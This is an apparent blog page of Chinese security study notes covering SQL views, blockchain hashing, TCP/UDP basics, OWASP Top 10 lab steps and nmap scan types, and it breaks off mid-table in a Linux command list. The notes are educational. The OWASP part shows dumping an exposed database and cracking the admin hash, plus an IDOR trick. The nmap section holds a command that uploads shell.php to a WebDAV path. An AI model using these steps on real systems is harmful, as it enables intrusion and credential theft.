<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://h01iday.github.io/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="H01iday">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://h01iday.github.io/page/3/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/3/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hexo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hexo</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">H01iday</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/10/SQL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/10/SQL/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-10 16:18:07" itemprop="dateCreated datePublished" datetime="2021-09-10T16:18:07+08:00">2021-09-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="常用的系统数据库视图："><a href="#常用的系统数据库视图：" class="headerlink" title="常用的系统数据库视图："></a>常用的系统数据库视图：</h3><table>
<thead>
<tr>
<th>数据库视图</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>sys.databases</td>
<td>SQL server中所有数据库</td>
</tr>
<tr>
<td>sys.sql_logins</td>
<td>SQL server中所有登录名</td>
</tr>
<tr>
<td>sys.all_columns</td>
<td>用户定义对象和系统对象的所有列的联合</td>
</tr>
<tr>
<td>sys.database_principals</td>
<td>数据库中每个权限或列异常权限</td>
</tr>
<tr>
<td>sys.database_files</td>
<td>存储在数据库中的数据库文件</td>
</tr>
<tr>
<td>sysobjects</td>
<td>数据库中创建的每个对象</td>
</tr>
<tr>
<td>information_schema.tables</td>
<td>当前用户数据库中的表</td>
</tr>
<tr>
<td>information_schema.columns</td>
<td>当前用户数据库中的列</td>
</tr>
</tbody></table>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/10/blockchain/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/10/blockchain/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-10 14:52:40" itemprop="dateCreated datePublished" datetime="2021-09-10T14:52:40+08:00">2021-09-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-08-15 10:17:17" itemprop="dateModified" datetime="2021-08-15T10:17:17+08:00">2021-08-15</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="密码学原理"><a href="#密码学原理" class="headerlink" title="密码学原理"></a>密码学原理</h2><ol>
<li><p>加密货币都是不加密的</p>
</li>
<li><p>区块链上的所有内容都是公开的</p>
</li>
<li><p>比特币主要用到密码学中的两个技术：哈希；签名</p>
</li>
<li><p>哈希碰撞  一个重要性质就是，x≠y，无法找到一个y使得H(x)=H(y)。</p>
<p>但是理论上比如说SHA256，输出值最大只能是2的256次方，而输入值是没有限制的，可以从0到无穷大。故理论上来说一定会存在多个值的哈希值相同。</p>
<p>但这里所说的x≠y，无法找到一个y使得H(x)=H(y)这个性质，指的是在通过很多人的努力和现阶段技术的发展，没有找到一个方法可以找到这个y罢了。</p>
<p>就是说，这个y肯定是客观存在的，但是很难找到，用现在的技术来说，找不到。</p>
</li>
<li><p>开户过程：用户自己创建一个公钥和私钥</p>
</li>
<li><p>生成公私钥的用处：签名。如果生成的公私钥对一样，则可以进行冒充。但这种概率太小，可以忽略不计。概率比地球爆炸的概率还要小</p>
</li>
<li></li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/10/Packets%20and%20Frames/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/10/Packets%20and%20Frames/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-10 14:52:33" itemprop="dateCreated datePublished" datetime="2021-09-10T14:52:33+08:00">2021-09-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-08-31 16:24:38" itemprop="dateModified" datetime="2021-08-31T16:24:38+08:00">2021-08-31</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Packets-amp-Frames"><a href="#Packets-amp-Frames" class="headerlink" title="Packets &amp; Frames"></a>Packets &amp; Frames</h2><h3 id="Task-1-What-are-Packets-and-Frames"><a href="#Task-1-What-are-Packets-and-Frames" class="headerlink" title="Task 1 What are Packets and Frames"></a>Task 1 What are Packets and Frames</h3><p>*网络中的data不是一次性全部传输过去，而是分块。这样</p>
<p>*网络层称为packet，经过封装到数据链路层称为frame。Think of this as putting an envelope within an envelope and sending it away. The first envelope will be the packet that you mail, but once it is opened, the envelope within still exists and contains data (this is a frame).</p>
<p>*IP协议下packet中header的信息</p>
<table>
<thead>
<tr>
<th><strong>Header</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Time to Live</td>
<td>超出TTL意味着当前网络可能拥挤；为减缓拥挤，丢掉该packet</td>
</tr>
<tr>
<td>Checksum</td>
<td>传输过程中，data发生改变/受损，会导致checksum改变。验证数据的完整性</td>
</tr>
<tr>
<td>Source Address</td>
<td></td>
</tr>
<tr>
<td>Destination Address</td>
<td></td>
</tr>
</tbody></table>
<h3 id="Task-2-TCP-IP-The-Three-Way-Handshake"><a href="#Task-2-TCP-IP-The-Three-Way-Handshake" class="headerlink" title="Task 2 TCP/IP (The Three-Way Handshake)"></a>Task 2 TCP/IP (The Three-Way Handshake)</h3><p>TCP：</p>
<ul>
<li><p><strong>connection-based</strong>, which means that TCP must establish a connection between both a client and a device acting as a server <strong>before</strong> data is sent.Because of this, TCP guarantees that any data sent will be received on the other end. </p>
<table>
<thead>
<tr>
<th><strong>Step</strong></th>
<th><strong>Message</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>SYN</td>
<td>发起三次连接请求的设备，告知对方初始序号</td>
</tr>
<tr>
<td>2</td>
<td>SYN/ACK</td>
<td>收到三次连接请求的设备，ack并告知对方自己的初始序号</td>
</tr>
<tr>
<td>3</td>
<td>ACK</td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>DATA</td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>FIN</td>
<td>发起结束连接的请求</td>
</tr>
<tr>
<td>#</td>
<td>RST</td>
<td>This packet abruptly ends all communication.</td>
</tr>
</tbody></table>
<img src="D:\blog\H01iday\source\_posts\pics\三次握手.png" alt="三次握手" style="zoom: 67%;" /></li>
</ul>
<img src="D:\blog\H01iday\source\_posts\pics\四次分手.png" alt="三次握手" style="zoom:67%;" />

<h3 id="Task-4-UDP-IP"><a href="#Task-4-UDP-IP" class="headerlink" title="Task 4 UDP/IP"></a>Task 4 UDP/IP</h3><img src="D:\blog\H01iday\source\_posts\pics\UDP.png" alt="UDP" style="zoom:67%;" />



<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/10/OWASP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/10/OWASP/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-10 14:52:17" itemprop="dateCreated datePublished" datetime="2021-09-10T14:52:17+08:00">2021-09-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-09-08 19:20:54" itemprop="dateModified" datetime="2021-09-08T19:20:54+08:00">2021-09-08</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="漏洞1：Injection"><a href="#漏洞1：Injection" class="headerlink" title="漏洞1：Injection"></a>漏洞1：Injection</h3><h3 id="漏洞2：Broken-Authentication"><a href="#漏洞2：Broken-Authentication" class="headerlink" title="漏洞2：Broken Authentication"></a>漏洞2：Broken Authentication</h3><h3 id="漏洞3：Sensetive-Data-Exposure"><a href="#漏洞3：Sensetive-Data-Exposure" class="headerlink" title="漏洞3：Sensetive Data Exposure"></a>漏洞3：Sensetive Data Exposure</h3><p>flat-file指以一个文件形式存储在计算机上的数据库。</p>
<p>如果数据库(现讨论flat-file)被存储在网站根目录之下(which连接到该网站的用户有权限访问)，那么用户可以将数据库下载并获取sensitive的信息</p>
<p>​    先把数据库文件 webapp.db下载</p>
<p><img src="D:\blog\H01iday\source_posts\pics\下载.png" alt="下载"></p>
<p>​    终端 cd navigate到下载文件的目录下</p>
<p>​        <img src="D:\blog\H01iday\source_posts\pics\位置.png" alt="位置"></p>
<p>​    查看信息（查看root下有没有该文件；file查看该文件的文件类型(使用的数据库类型)）</p>
<p><img src="D:\blog\H01iday\source_posts\pics\查看信息.png" alt="查看信息"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\数据库类型.png" alt="数据库类型"></p>
<p>​    access to the database<code>sqlite3 &lt;database-name&gt;</code></p>
<p>![access to database](D:\blog\H01iday\source_posts\pics\access to database.png)</p>
<p>​    查看所有table的信息<code>.tables</code></p>
<p><img src="D:\blog\H01iday\source_posts\pics.table.png" alt="table"></p>
<p>​    查看对应table的信息<code>PRAGMA table_info(table_name);</code>  <code>SELECT * FROM (table_name);</code></p>
<p><img src="D:\blog\H01iday\source_posts\pics\查看某table信息.png" alt="查看某table信息"></p>
<p>​    找到username为admin的password(可以看到是hash之后的结果)可以通过工具/网站如crackstation.net来获取明文password。</p>
<h4 id="漏洞4：XML-External-Entity"><a href="#漏洞4：XML-External-Entity" class="headerlink" title="漏洞4：XML External Entity"></a>漏洞4：XML External Entity</h4><h4 id="漏洞5：Broken-Access-Control"><a href="#漏洞5：Broken-Access-Control" class="headerlink" title="漏洞5：Broken Access Control"></a>漏洞5：Broken Access Control</h4><p>If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.</p>
<h5 id="IDOR-Insecure-Direct-Object-Reference"><a href="#IDOR-Insecure-Direct-Object-Reference" class="headerlink" title="IDOR(Insecure Direct Object Reference)"></a>IDOR(Insecure Direct Object Reference)</h5><p>例子：</p>
<p>成功登录了用户名为root密码为test1234的用户的主页</p>
<p><code>http://10.10.147.121/note.php?note=1</code></p>
<p>当我修改参数为note=0</p>
<p>得到flag{fivefourthree}[本质上是另一个用户的主页]</p>
<p>所以其实就是我修改URL可以获得所有资源，因为资源的access没有通过身份验证。</p>
<h4 id="漏洞6：Security-Misconfiguration"><a href="#漏洞6：Security-Misconfiguration" class="headerlink" title="漏洞6：Security Misconfiguration"></a>漏洞6：Security Misconfiguration</h4><h4 id="漏洞7：Cross-site-Scripting-XSS"><a href="#漏洞7：Cross-site-Scripting-XSS" class="headerlink" title="漏洞7：Cross-site Scripting XSS"></a>漏洞7：Cross-site Scripting XSS</h4><p><a target="_blank" rel="noopener" href="https://xss.pwnfunction.com/%E5%81%9A%E9%A2%98">https://xss.pwnfunction.com/做题</a></p>
<h4 id="漏洞8：Insecure-Deserialization"><a href="#漏洞8：Insecure-Deserialization" class="headerlink" title="漏洞8：Insecure Deserialization"></a>漏洞8：Insecure Deserialization</h4>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/10/nmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/10/nmap/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-10 14:52:10" itemprop="dateCreated datePublished" datetime="2021-09-10T14:52:10+08:00">2021-09-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-09-05 19:07:16" itemprop="dateModified" datetime="2021-09-05T19:07:16+08:00">2021-09-05</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Scan-Types"><a href="#Scan-Types" class="headerlink" title="Scan Types"></a>Scan Types</h2><h4 id="TCP-Connect-scan（-sT）"><a href="#TCP-Connect-scan（-sT）" class="headerlink" title="TCP Connect scan（-sT）"></a>TCP Connect scan（-sT）</h4><p>a TCP Connect scan works by performing the three-way handshake with each target port in turn. In other words, Nmap tries to connect to each specified TCP port, and determines whether the service is open by the response it receives.</p>
<p>检测某个端口是否open，对该端口发起三次握手，对目标服务器发送设置SYN的packet，发起第一次握手</p>
<p>可能1：端口关闭，目标服务器返回带有RST(Reset)的packet</p>
<p>可能2：端口打开，目标服务器返回SYN/ACK的packet</p>
<p>可能3：数据包被目标端的防火墙拦截。即filtered。则目标服务器收不到请求packet。如果将防火墙设置为返回RST【 it is very easy to configure a firewall to respond with a RST TCP packet.This can make it extremely difficult (if not impossible即使并非不可能) to get an accurate reading of the target(s).】</p>
<h4 id="SYN-Scans（-sS）-referred-to-as-“Half-open”-scans-or-“Stealth”-scans"><a href="#SYN-Scans（-sS）-referred-to-as-“Half-open”-scans-or-“Stealth”-scans" class="headerlink" title="SYN Scans（-sS）[ referred to as “Half-open” scans, or “Stealth” scans.]"></a>SYN Scans（-sS）[ referred to as “<em>Half-open”</em> scans, or <em>“Stealth”</em> scans.]</h4><p>和TCP Connect scan相比， SYN scans sends back a RST TCP packet after receiving a SYN/ACK from the server (this prevents the server from repeatedly trying to make the request). </p>
<img src="D:\blog\H01iday\source\_posts\pics\SYN Scan.png" alt="SYN Scan" style="zoom:67%;" />

<p>好处1：逃过老的入侵检测系统的发现。因为这些检测系统都在检测<code>full three way handshake</code></p>
<p>好处2：侦听开放端口的应用程序不会记录SYN Scans，理由同上</p>
<p>好处3：无需完全建立连接，故也无需四次分手。速度快</p>
<p>handle open port：发送RST</p>
<p>handle closed/filtered port：和TCP Connect scan一样</p>
<p>坏处1：需要sudo权限(linux)。因为SYN Scans需要能够建立原始数据包(which is root user的权限)</p>
<p><strong>【Nmap默认scan：SYN scan（有sudo权限）；TCP Connect scan（无sudo权限）】</strong></p>
<h4 id="UDP-scans（-sU）"><a href="#UDP-scans（-sU）" class="headerlink" title="UDP scans（-sU）"></a>UDP scans（-sU）</h4><p>packet发送给UDP port</p>
<p>无响应：Nmap认为该端口open|filtered</p>
<p>有响应：响应返回ICMP(ping) packet containing a message that the port is unreachable.</p>
<p>scan花费时间很长，scan前1000个端口需要20mins。故<code>--top-ports &lt;number&gt;</code></p>
<p>scanning with <code>nmap -sU --top-ports 20 &lt;target&gt;</code>. 会scan最常使用的前20个port</p>
<h4 id="NULL-FIN-and-Xmas-TCP-port-scans"><a href="#NULL-FIN-and-Xmas-TCP-port-scans" class="headerlink" title="NULL, FIN and Xmas TCP port scans"></a>NULL, FIN and Xmas TCP port scans</h4><h5 id="NULL-scans-sN"><a href="#NULL-scans-sN" class="headerlink" title="NULL scans (-sN)"></a>NULL scans (-sN)</h5><p>TCP request is sent with no flags set at all.</p>
<p>Nmap expects a RST if the port is closed.</p>
<p>If the port is open then there is no response</p>
<h5 id="FIN-scans-sF"><a href="#FIN-scans-sF" class="headerlink" title="FIN scans (-sF)"></a>FIN scans (-sF)</h5><p>TCP request is sent with the FIN flag</p>
<p>Nmap expects a RST if the port is closed.</p>
<p>If the port is open then there is no response</p>
<h5 id="Xmas-scans-sX"><a href="#Xmas-scans-sX" class="headerlink" title="Xmas scans (-sX)"></a>Xmas scans (-sX)</h5><p>TCP request发送格式错误的数据包 sets (PSH, URG and FIN)【正常情况下的数据包这三个参数不能同时置1】</p>
<p>Nmap expects a RST if the port is closed.</p>
<p>If the port is open then there is no response</p>
<p>open/filtered都没有response。有时可以判断出filtered是因为返回了ICMP unreachable packet</p>
<p>故：</p>
<p>状态1：open/filtered无返回</p>
<p>状态2：filtered返回了ICMP unreachable packet</p>
<p>状态3：closed返回了RST的packet</p>
<p>【特殊情况】</p>
<p>Microsoft Windows (and a lot of Cisco network devices)，对所有格式错误数据包都返回RST，不管端口是否开放。这种情况无法判断</p>
<h4 id="ICMP-Networking-Scanning"><a href="#ICMP-Networking-Scanning" class="headerlink" title="ICMP Networking Scanning"></a>ICMP Networking Scanning</h4><p>查看哪些IP地址包含活动主机</p>
<p>Nmap sends an ICMP packet to each possible IP address for the specified network. When it receives a response, it marks the IP address that responded as being alive. </p>
<p><code>nmap -sn 192.168.0.1-254</code>即ping192.168.0.1-254里面所有主机</p>
<p><code>nmap -sn 192.168.0.0/24</code>同上</p>
<h4 id="NSE-Script"><a href="#NSE-Script" class="headerlink" title="NSE Script"></a>NSE Script</h4><p>运行特定的脚本<code>--script=&lt;script-name&gt;</code>  e.g. <code>--script=http-fileupload-exploiter</code>.</p>
<p>同时运行多个脚本，用逗号隔开<code>--script=smb-enum-users,smb-enum-shares</code></p>
<p>如何添加参数 使用<code>--script-args</code>  例<code>nmap -p 80 --script http-put --script-args http-put.url=&#39;/dav/shell.php&#39;,http-put.file=&#39;./shell.php&#39;</code></p>
<p>关于特定script的帮助文档<code> nmap --script-help &lt;script-name&gt;</code>可以查看对应script的信息</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/09/10/linux/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/09/10/linux/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-09-10 14:51:39" itemprop="dateCreated datePublished" datetime="2021-09-10T14:51:39+08:00">2021-09-10</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-10 14:00:18" itemprop="dateModified" datetime="2021-10-10T14:00:18+08:00">2021-10-10</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>echo</td>
<td>输出</td>
</tr>
<tr>
<td>whoami</td>
<td>查看当前登录用户</td>
</tr>
<tr>
<td>ls</td>
<td>列出当前目录下的所有文件；ls -t将文件名按照时间顺序排列出来</td>
</tr>
<tr>
<td>cd</td>
<td>改变当前路径   【cd ..返回上层目录】【cd home目录】【cd /根目录】</td>
</tr>
<tr>
<td>cat</td>
<td>输出文件的内容</td>
</tr>
<tr>
<td>pwd</td>
<td>输出当前目录的绝对路径</td>
</tr>
<tr>
<td>find</td>
<td>find -name passwords.txt(查找该文件在当前目录下的相对路径)                                             find -name *.txt(查找后缀为.txt的文件的相对路径)</td>
</tr>
<tr>
<td>grep</td>
<td>grep “THM” access.log查找access.log中出现”THM“的地方。相当于搜索功能</td>
</tr>
<tr>
<td>Operator</td>
<td></td>
</tr>
<tr>
<td>&amp;</td>
<td>在后台运行一个任务</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>command1 &amp;&amp; command2运行多个任务。command2在command1运行成功之后才会运行</td>
</tr>
<tr>
<td>&gt;</td>
<td>echo hey &gt; welcome 把hey写入文件welcome；如果welcome文件已存在，会被覆盖</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>echo hey &gt;&gt; welcome 把hey写入文件welcome；如果welcome文件已存在，不会覆盖，跟在原内容后面</td>
</tr>
<tr>
<td>ssh</td>
<td>ssh <a href="mailto:&#116;&#114;&#x79;&#104;&#97;&#99;&#x6b;&#x6d;&#101;&#64;&#49;&#48;&#x2e;&#x31;&#x30;&#46;&#54;&#x30;&#46;&#50;&#x30;&#55;">&#116;&#114;&#x79;&#104;&#97;&#99;&#x6b;&#x6d;&#101;&#64;&#49;&#48;&#x2e;&#x31;&#x30;&#46;&#54;&#x30;&#46;&#50;&#x30;&#55;</a>   [ssh控制远程计算机 tryhackme为登录用户名，@后面跟目标机器的ip地址]</td>
</tr>
<tr>
<td>-a/–all</td>
<td>ls -a[显示所有文件，包括隐藏文件]</td>
</tr>
<tr>
<td>–help</td>
<td>列出所有可能的选项</td>
</tr>
<tr>
<td>man</td>
<td>例man ls 显示ls这个命令如何使用</td>
</tr>
<tr>
<td>-lh</td>
<td>显示文件所有详细信息</td>
</tr>
<tr>
<td>touch</td>
<td>创建文件</td>
</tr>
<tr>
<td>mkdir</td>
<td>创建文件夹</td>
</tr>
<tr>
<td>cp</td>
<td>cp file1 file2 复制file1的内容到file2</td>
</tr>
<tr>
<td>mv</td>
<td>功能①将文件移到其它文件夹：mv note1 dir[将note1文件移到dir文件夹]②重命名文件/文件夹  ：mv oldnote newnote[将oldnote文件重命名为newnote]</td>
</tr>
<tr>
<td>rm</td>
<td>rm note[删除note文件] rm -R mydirectory[删除mydirectory文件夹，注意要有-R！]</td>
</tr>
<tr>
<td>file</td>
<td>file note[查看note文件的文件类型]</td>
</tr>
<tr>
<td>ps</td>
<td>查看运行中的进程</td>
</tr>
<tr>
<td>ps aux</td>
<td>查看所有进程(包括其他user的和不运行在会话中的系统进程等)</td>
</tr>
<tr>
<td>top</td>
<td>实时查看进程变化</td>
</tr>
<tr>
<td>kill</td>
<td>kill PID(PID为进程号) 终止进程</td>
</tr>
<tr>
<td>SIGTERM</td>
<td>终止进程，终止前运行进行清理任务</td>
</tr>
<tr>
<td>SIGKILL</td>
<td>终止进程，不做任何清理</td>
</tr>
<tr>
<td>SIGSTOP</td>
<td>挂起一个进程</td>
</tr>
<tr>
<td>su</td>
<td>su username 转换为另一个user</td>
</tr>
<tr>
<td>ssh</td>
